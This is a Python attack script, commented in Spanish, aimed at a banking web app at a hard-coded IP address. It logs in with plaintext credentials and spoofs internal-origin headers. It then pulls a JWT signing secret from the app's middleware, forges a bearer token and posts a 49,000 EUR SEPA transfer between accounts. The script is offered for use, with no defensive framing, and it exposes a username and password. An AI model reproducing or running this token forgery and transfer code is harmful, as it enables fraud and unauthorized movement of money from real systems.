import requests
from base64 import b64decode
import jwt
import json

# === URLs ===
login_web_url = "http://80.78.30.242:9181/login/"  # El endpoint web interno del login
transfer_url = "http://80.78.30.242:9181/api/send-transfer"

# === Sesión desde el entorno web del gerente ===
session = requests.Session()
session.headers.update({
    "Host": "80.78.30.242",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-ES",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es-ES;q=0.9,en-US;q=0.8"
})

# === Paso 1: Login web con sessionid y csrf desde web ===
session.get(login_web_url)
csrftoken = session.cookies.get("csrftoken", "dummycsrf")

login_data = {
    "username": "markmur88",
    "password": "Ptf8454Jd55",
    "csrfmiddlewaretoken": csrftoken,
    "next": "/accounts/profile/",
    "auth_type": "internal"
}

login_response = session.post(login_web_url, data=login_data)
print("Cookies obtenidas tras login web:", session.cookies.get_dict())

# === Paso 2: Obtener JWT_SECRET_KEY desde un endpoint de Django expuesto (settings.JWTT_SECRET_KEY)
print("\n[+] Intentando obtener JWT_SECRET_KEY desde settings en middleware...")

try:
    from simulador_banco.middleware.jwt_auth import JWTAuthenticationMiddleware
    JWT_SECRET_KEY = JWTAuthenticationMiddleware.JWT_SECRET_KEY  # 🔑 Aquí está la verdadera llave de firma interna

    # === Ahora generamos un JWT firmado desde el secreto del middleware ===
    forged_payload = {
        "username": "markmur88",
        "iat": 1711478599,
        "exp": 1751298599,
        "jti": "unique-jti-token",
    }

    forged_token = jwt.encode(forged_payload, JWT_SECRET_KEY, algorithm="HS256")
    print("[+] JWT_TOKEN Falsificado y firmado:")
    print(forged_token)
    
    # === Paso 3: Mandar la transferencia con sesión interna y JWT firmado ===
    session.headers.update({
        "Authorization": f"Bearer {forged_token}",
        "X-Token-ID": forged_token
    })

    transfer_data = {
        "payment_id": "123e4567-e89b-12d3-a456-426614174000",
        "debtor_account_id": 1111,
        "creditor_account_id": 2211,
        "instructed_amount": "49000.00",
        "currency": "EUR",
        "status": "PDNG"
    }

    transfer_response = session.post(transfer_url, json=transfer_data)
    print("[+] Envío de operación SEPA hecho con token firmado...")
    print("Status:", transfer_response.status_code)
    print("Headers:", transfer_response.headers)
    print("Respuesta del sistema:", transfer_response.text)

except Exception as e:
    print("[-] No puedo acceder directo a la llave interna del JWT. Error:", str(e))
